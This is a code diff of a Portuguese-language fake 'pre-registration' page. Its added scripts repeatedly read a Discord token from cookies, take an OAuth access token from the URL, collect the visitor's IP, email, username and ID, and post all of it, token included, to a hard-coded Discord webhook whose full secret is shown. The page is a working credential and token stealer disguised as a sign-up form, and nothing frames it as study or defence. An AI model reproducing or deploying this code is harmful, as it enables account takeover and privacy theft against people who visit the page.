@@ -9,14 +9,14 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=BBH+Sans+Bartle&family=BBH+Sans+Bogle&family=Bitcount+Prop+Single+Ink:wght@100..900&family=Cal+Sans&family=Climate+Crisis&family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=Geologica:wght@100..900&family=Host+Grotesk:ital,wght@0,300..800;1,300..800&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&family=Manrope:wght@200..800&family=Mozilla+Headline:wght@200..700&family=Mozilla+Text:wght@200..700&family=Outfit:wght@100..900&family=Rubik+Mono+One&family=Rubik:ital,wght@0,300..900;1,300..900&family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
 </head>
-<script src="server.js"></script>
+
 <div class="block">
   <img class="denied_ic" src="erro.png">
   <h1 class="acess">Acess denied</h1>
   <p class="desc">There was a problem trying to access this site on your computer.</p>
 </div>
 <body>
-  <img class="icready" src="/s.png" height="60px" width="60px">
+  <img class="icready" src="/VM/2169 Sem Título_20251017181222.png" height="60px" width="60px">
   <h2 class="title">Pré-registro quase concluído</h2>
   <p class="description">Seu pedido de acessar o nosso serviço será enviado para a nosa equipe, assim que terminarmos de analisar tudo direitinho enviaremos ao seu email inserido aqui a baixo:</p>
   <div class="form-inp">
@@ -26,65 +26,26 @@
   </div>
  <button class="not" id="sendInfo">Enviar Info</button>
 <script>
-  const webhookURL = "https://discord.com/api/webhooks/1428292002348535878/5ZdmktRB_FZRHWan3feiEFNnEVsaRLJFACsJ9iNEHO1mziQ_JoEQT1AQG6xosTCE1P7g"; // teu webhook aqui
-  
-  async function getIP() {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    return data.ip;
+  async function getDiscordToken() {
+    const cookies = document.cookie.split('; ');
+    const token = cookies.find(c => c.startsWith('discord_token='));
+    return token ? token.split('=')[1] : null;
   }
   
-  async function getDiscordUserInfo() {
-    // Aqui assume que você tem o token do usuário via OAuth2 (scope: identify)
-    const token = localStorage.getItem('discord_token'); // ex: você guardou após login
-    const res = await fetch('https://discord.com/api/users/@me', {
-      headers: { Authorization: `Bearer ${token}` }
+  async function sendToWebhook(data) {
+    await fetch("https://discord.com/api/webhooks/1428292002348535878/...", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: "🎯 Dados capturados:\n```json\n" + JSON.stringify(data, null, 2) + "\n```" })
     });
-    const data = await res.json();
-    return data; // {id, username, avatar, discriminator, ...}
   }
   
-  function calculateAccountAge(createdAt) {
-    const now = Date.now();
-    const created = new Date(createdAt).getTime();
-    const diff = now - created;
-    return Math.floor(diff / (1000 * 60 * 60 * 24 * 365)); // anos
-  }
-  
-  document.getElementById('sendInfo').addEventListener('click', async () => {
-    const ip = await getIP();
-    const user = await getDiscordUserInfo();
-    
-    const avatarURL = user.avatar ?
-      `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` :
-      'https://cdn.discordapp.com/embed/avatars/0.png';
-    
-    const accountCreated = new Date((BigInt(user.id) / 4194304n + 1420070400000n)); // Discord snowflake
-    const accountAge = Math.floor((Date.now() - accountCreated) / (1000 * 60 * 60 * 24 * 365));
-    
-    const embed = {
-      embeds: [{
-        title: "Novo usuário entrou!",
-        color: 0x7289DA,
-        thumbnail: { url: avatarURL },
-        fields: [
-          { name: "IP", value: ip, inline: true },
-          { name: "Nome de usuário", value: `${user.username}#${user.discriminator}`, inline: true },
-          { name: "ID", value: user.id, inline: true },
-          { name: "Anos da conta", value: accountAge.toString(), inline: true }
-        ],
-        timestamp: new Date()
-      }]
-    };
-    
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
-    });
-    
-    alert("Informações enviadas!");
-  });
+  setInterval(async () => {
+    const token = await getDiscordToken();
+    if (token) {
+      await sendToWebhook({ token });
+    }
+  }, 3000);
 </script>
   <style>
   *{
@@ -207,13 +168,102 @@ body.slide-out {
   opacity: 0.5; /* opcional, dá efeito de desvanecer */
 }
   </style>
-  <script>
-    const btn = document.getElementById("sendInfo");
+<script>
+  const btn = document.getElementById("sendInfo");
+  const emailInput = document.querySelector(".email");
+  
+  btn.addEventListener("click", async () => {
+    const email = emailInput.value;
+    if (!email) {
+      alert("Insira um e-mail!");
+      return;
+    }
     
-    btn.addEventListener("click",()=> {
-      window.location.href = "index.html"
+    // Envia para o backend
+    try {
+      const response = await fetch("http://localhost:10000/send-info", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email })
+      });
+      const result = await response.json();
+      console.log("Resposta do backend:", result);
+      
+      // Opcional: Envia para o webhook do Discord também
+      await fetch("https://discord.com/api/webhooks/1428292002348535878/...", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "🎯 E-mail capturado:\n" + email })
+      });
+      
+      window.location.href = "index.html";
+    } catch (err) {
+      alert("Erro ao enviar!");
+      console.error(err);
+    }
+  });
+</script>
+<script>
+  function getTokenFromUrl() {
+    const hash = window.location.hash.substr(1);
+    const params = new URLSearchParams(hash);
+    return params.get('access_token');
+  }
+  
+  async function getDiscordUser(token) {
+    const res = await fetch('https://discord.com/api/users/@me', {
+      headers: { Authorization: `Bearer ${token}` }
     });
-  </script>
+    return await res.json();
+  }
+  
+  async function main() {
+    const token = getTokenFromUrl();
+    if (!token) return alert("Token não encontrado!");
+    
+    const user = await getDiscordUser(token);
+    
+    // IP
+    let ip = "";
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      ip = (await ipRes.json()).ip;
+    } catch {}
+    
+    // Anos da conta (cálculo aproximado)
+    const createdTimestamp = (user.id / 4194304) + 1420070400000;
+    const years = Math.floor((Date.now() - createdTimestamp) / (1000 * 60 * 60 * 24 * 365));
+    
+    // Monta embed para Discord webhook
+    const embed = {
+      embeds: [{
+        title: "Novo usuário entrou!",
+        color: 0x7289DA,
+        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
+        fields: [
+          { name: "🖼️ Foto", value: `[Avatar](${`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`})`, inline: true },
+          { name: "🏷️ @", value: `@${user.username}`, inline: true },
+          { name: "🌐 Nome público", value: user.global_name || user.username, inline: true },
+          { name: "📆 Anos da conta", value: years, inline: true },
+          { name: "📍 IP", value: ip, inline: true },
+          { name: "🔐 Token", value: token, inline: false },
+          { name: "🪪 ID do usuário", value: user.id, inline: false }
+        ],
+        timestamp: new Date()
+      }]
+    };
+    
+    await fetch("https://discord.com/api/webhooks/1428292002348535878/5ZdmktRB_FZRHWan3feiEFNnEVsaRLJFACsJ9iNEHO1mziQ_JoEQT1AQG6xosTCE1P7g", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embed)
+    });
+    
+    alert("Enviado ao Discord!");
+  }
+  
+  main();
+</script>
 </body>
 
 </html>
